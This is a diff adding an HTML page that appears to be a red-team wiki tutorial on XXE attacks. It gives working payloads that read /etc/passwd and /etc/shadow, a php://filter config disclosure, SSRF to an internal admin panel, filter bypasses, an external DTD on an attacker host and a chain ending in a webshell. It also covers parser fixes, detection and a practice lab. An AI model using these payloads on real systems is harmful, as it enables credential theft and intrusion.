+							<abbr title="Extensible Markup Language">XML</abbr>
+							bodies.
+						</p>
+						<pre class="bash">
+curl -X POST &#39;http://target/soap-endpoint&#39; \
+  -H &#39;Content-Type: text/xml&#39; \
+  -H &#39;SOAPAction: &#34;&#34;&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+&lt;soap:Envelope xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;
+  &lt;soap:Body&gt;
+    &lt;GetData&gt;
+      &lt;id&gt;&amp;xxe;&lt;/id&gt;
+    &lt;/GetData&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="xxe-in-json-endpoints">XXE in JSON Endpoints</h3>
+						<p>
+							Some applications parse
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							but internally convert to
+							<abbr title="Extensible Markup Language">XML</abbr>
+							for legacy backends. The conversion library may support
+							<abbr title="Extensible Markup Language">XML</abbr>
+							constructs
+							within
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							, or the content type negotiation allows sending
+							<abbr title="Extensible Markup Language">XML</abbr>
+							to a
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							endpoint.
+						</p>
+						<pre class="bash">
+# Try changing Content-Type from application/json to application/xml
+curl -X POST &#39;http://target/api/data&#39; \
+  -H &#39;Content-Type: application/xml&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="xxe-ssrf-rce-chain">XXE -> SSRF -> RCE Chain</h3>
+						<p>A common escalation chain:</p>
+						<pre class="plaintext">
+XXE → Read source code → Find credentials → Authenticate to admin/internal service → Upload webshell / execute command
+						</pre>
+						<h4 id="step-1-source-code-disclosure">Step 1: Source code disclosure</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=/var/www/html/config.php&#34;&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+						</pre>
+						<h4 id="decode-config-find-credentials">Decode Config, Find Credentials</h4>
+						<h4 id="ssrf-to-internal-admin-panel">SSRF to Internal Admin Panel</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM &#34;http://admin:password@127.0.0.1:8080/admin/backup&#34;&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+						</pre>
+						<h4 id="webshell-or-backup-restore">Webshell or Backup Restore</h4>
+					</section>
+					<section>
+						<h3 id="xxe-bypass-techniques">XXE Bypass Techniques</h3>
+						<h4 id="utf-7-encoding">UTF-7 Encoding</h4>
+						<pre class="bash">
+# UTF-7 encoded &#34;+ADw-?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4-&#34;
+# Decodes to: &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;
+echo &#39;+ADw-?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4-&lt;!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;+AD4-]&gt;&lt;foo&gt;+ACY-xxe+ADs-&lt;/foo&gt;&#39; | iconv -f UTF-7 -t UTF-8
+						</pre>
+						<p>
+							Send with
+							<code>Content-Type: text/xml; charset=UTF-7</code>
+							.
+						</p>
+						<h4 id="parameter-entity-wrapping">Parameter Entity Wrapping</h4>
+						<p>
+							Some filters block
+							<code>SYSTEM</code>
+							in general entities but miss it in parameter entities:
+						</p>
+						<pre class="xml">
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+    &lt;!ENTITY wrapper &#34;%xxe;&#34;&gt;
+]&gt;
+						</pre>
+						<h4 id="external-dtd-bypass">External DTD Bypass</h4>
+						<p>
+							If a parser allows external DTDs but restricts entity definitions within the document's DOCTYPE,
+							host the entities externally:
+						</p>
+						<pre class="xml">
+&lt;!-- In the HTTP request: --&gt;
+&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE foo SYSTEM &#34;http://attacker/evil.dtd&#34;&gt;
+&lt;foo&gt;&amp;file;&lt;/foo&gt;
+						</pre>
+						<pre class="xml">
+&lt;!-- evil.dtd on attacker server: --&gt;
+&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+						</pre>
+						<h4 id="cdata-wrapping-for-binary-files">CDATA Wrapping for Binary Files</h4>
+						<p>
+							For files with
+							<code>&amp;</code>
+							,
+							<code>&lt;</code>
+							, or
+							<code>&gt;</code>
+							that would break
+							<abbr title="Extensible Markup Language">XML</abbr>
+							parsing:
+						</p>
+						<pre class="xml">
+&lt;!-- evil.dtd --&gt;
+&lt;!ENTITY % start &#34;&lt;![CDATA[&#34;&gt;
+&lt;!ENTITY % file SYSTEM &#34;file:///etc/shadow&#34;&gt;
+&lt;!ENTITY % end &#34;]]&gt;&#34;&gt;
+&lt;!ENTITY % wrapper &#34;&lt;!ENTITY all &#39;%start;%file;%end;&#39;&gt;&#34;&gt;
+%wrapper;
+						</pre>
+					</section>
+					<section>
+						<h3 id="detection">Detection</h3>
+						<h4 id="find-xml-inputs-first">Find XML inputs first</h4>
+						<pre class="bash">
+# Content-Type in responses
+curl -s -I &#39;http://target/&#39; | grep -i content-type
+
+# Find endpoints that accept XML
+curl -X POST &#39;http://target/api&#39; \
+  -H &#39;Content-Type: application/xml&#39; \
+  -d &#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;test/&gt;&#39; -v
+
+# Check for SOAP
+curl &#39;http://target/service?wsdl&#39;
+						</pre>
+						<h4 id="confirm-xxe-with-a-benign-test">Confirm XXE with a benign test</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY test &#34;XXE_WORKS&#34;&gt; ]&gt;
+&lt;foo&gt;&amp;test;&lt;/foo&gt;
+						</pre>
+						<p>
+							If the response contains
+							<code>XXE_WORKS</code>
+							, entity substitution is enabled.
+						</p>
+						<h4 id="test-for-external-entities">Test for external entities</h4>
+						<pre class="xml">
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;http://YOUR_CALLBACK_SERVER/test&#34;&gt; ]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+						</pre>
+						<p>
+							Listen:
+							<code>python3 -m http.server 8888</code>
+							or use Burp Collaborator.
+						</p>
+					</section>
+					<section>
+						<h3 id="fixes">Fixes</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Language/Parser</th>
+									<th align="center">Secure Configuration</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">PHP (DOMDocument)</td>
+									<td align="center"><code>$doc-&gt;loadXML($xml)</code>- external entity loading off since PHP 8.0</td>
+								</tr>
+								<tr>
+									<td align="center">PHP (SimpleXML)</td>
+									<td align="center">Avoid passing<code>LIBXML_NOENT</code>flag</td>
+								</tr>
+								<tr>
+									<td align="center">Java (DocumentBuilder)</td>
+									<td align="center"><code>factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true)</code></td>
+								</tr>
+								<tr>
+									<td align="center">Java (SAXParser)</td>
+									<td align="center"><code>factory.setFeature(&#34;http://xml.org/sax/features/external-general-entities&#34;, false)</code></td>
+								</tr>
+								<tr>
+									<td align="center">Python (lxml)</td>
+									<td align="center">Use default<code>XMLParser()</code>- external entities stay unresolved</td>
+								</tr>
+								<tr>
+									<td align="center">Python (xml.etree)</td>
+									<td align="center">Use<code>defusedxml</code>library instead of stdlib<code>xml</code></td>
+								</tr>
+								<tr>
+									<td align="center">.NET</td>
+									<td align="center"><code>XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit</code></td>
+								</tr>
+								<tr>
+									<td align="center">Node.js</td>
+									<td align="center">Use<code>libxmljs</code>with<code>{ noent: false, dtdload: false }</code></td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<b>The universal rule:</b>
+							Disable DTD processing entirely if you don't need it. If you do need
+							DTDs for schema validation, disable external entity resolution specifically.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							The lab container exposes in-band, error-based, blind, and upload-based parsers. Start with
+							the in-band endpoint to confirm that entity substitution is enabled, then point the blind endpoint
+							at a listener on your own host, and finish with the SVG and DOCX uploads.
+						</p>
+						<p><a href="/wiki/articles/redteam/xxe.Containerfile">xxe.Containerfile</a></p>
+						<pre class="bash">
+podman build -t xxe -f xxe.Containerfile .
+podman run -d -p 5000:5000 xxe
+
+# Endpoints:
+# In-band XXE:         POST /order           {xml}
+# Error-based XXE:     POST /validate         {xml}
+# Blind (OOB) XXE:     POST /import           {xml}
+# SVG upload XXE:      POST /svg/upload       multipart (file: image)
+# Office XML XXE:      POST /doc/upload       multipart (file: document.docx)
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE" target="_blank">OWASP - XML External Entity (XXE) Processing</a> _Processing) - attack classes and impact</li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank">OWASP - XXE Prevention Cheat Sheet</a> - parser hardening per language</li>
+							<li><a class="icon-website" href="https://www.w3.org/TR/xml/" target="_blank">W3C - Extensible Markup Language (XML) 1.0</a> - DTD and entity definitions</li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/611.html" target="_blank">CWE-611 - Improper Restriction of XML External Entity Reference</a> - weakness classification</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
